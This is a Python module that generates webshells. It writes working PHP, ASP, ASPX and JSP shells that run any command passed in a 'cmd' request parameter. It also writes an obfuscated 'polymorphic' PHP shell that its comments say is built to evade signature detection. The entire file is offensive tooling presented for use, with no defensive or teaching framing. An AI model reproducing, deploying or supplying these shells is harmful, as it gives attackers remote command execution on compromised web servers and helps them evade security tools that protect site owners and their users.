"""
Payload Generator Module
Creates various webshell payloads for different server technologies
"""

import os
import random
import string
from typing import Dict

class PayloadGenerator:
    """Generate webshells for different server environments"""
    
    def __init__(self, output_dir: str = "payloads"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, "polymorphic"), exist_ok=True)
    
    def generate_all_payloads(self) -> Dict[str, str]:
        """Generate all payload types and return their paths"""
        payloads = {}
        
        payloads['php'] = self.generate_php_shell()
        payloads['asp'] = self.generate_asp_shell()
        payloads['aspx'] = self.generate_aspx_shell()
        payloads['jsp'] = self.generate_jsp_shell()
        payloads['php_poly'] = self.generate_polymorphic_php()
        
        return payloads
    
    def generate_php_shell(self) -> str:
        """Generate standard PHP webshell"""
        code = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>'''
        path = os.path.join(self.output_dir, "shell.php")
        with open(path, 'w') as f:
            f.write(code)
        return path
    
    def generate_asp_shell(self) -> str:
        """Generate ASP webshell"""
        code = '''<%
If Request.QueryString("cmd") <> "" Then
    Dim oScript
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Dim oScriptNet
    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
    Dim oFileSys
    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
    Dim oFile
    Set oFile = oFileSys.CreateTextFile(Server.MapPath(".") & "\\output.txt", True)
    
    Dim szCMD, szTempFile
    szCMD = Request.QueryString("cmd")
    szTempFile = Server.MapPath(".") & "\\output.txt"
    
    Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    
    Dim szOutput
    szOutput = oFileSys.OpenTextFile(szTempFile, 1, False, 0).ReadAll
    Response.Write "<pre>" & szOutput & "</pre>"
End If
%>'''
        path = os.path.join(self.output_dir, "shell.asp")
        with open(path, 'w') as f:
            f.write(code)
        return path
    
    def generate_aspx_shell(self) -> str:
        """Generate ASPX webshell"""
        code = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["cmd"] != null)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            Response.Write("<pre>" + output + "</pre>");
        }
    }
</script>'''
        path = os.path.join(self.output_dir, "shell.aspx")
        with open(path, 'w') as f:
            f.write(code)
        return path
    
    def generate_jsp_shell(self) -> str:
        """Generate JSP webshell"""
        code = '''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line;
        out.println("<pre>");
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
        reader.close();
    }
%>'''
        path = os.path.join(self.output_dir, "shell.jsp")
        with open(path, 'w') as f:
            f.write(code)
        return path
    
    def generate_polymorphic_php(self) -> str:
        """Generate obfuscated PHP shell to evade signatures"""
        # Generate random variable names
        var1 = ''.join(random.choices(string.ascii_lowercase, k=8))
        var2 = ''.join(random.choices(string.ascii_lowercase, k=8))
        var3 = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        code = f'''<?php
${var1} = $_REQUEST;
${var2} = 'sys'.'tem';
if(isset(${var1}['cmd'])){{
    ${var3} = ${var1}['cmd'];
    ${var2}(${var3});
}}
?>'''
        path = os.path.join(self.output_dir, "polymorphic", "shell_poly.php")
        with open(path, 'w') as f:
            f.write(code)
        return path
    
    @staticmethod
    def get_payload_info() -> Dict[str, str]:
        """Return information about available payloads"""
        return {
            'php': 'PHP webshell - works on Apache/Nginx with PHP',
            'asp': 'Classic ASP shell - IIS servers',
            'aspx': 'ASP.NET shell - IIS with .NET framework',
            'jsp': 'Java Server Pages shell - Tomcat/JBoss',
            'php_poly': 'Polymorphic PHP - evades basic signatures'
        }
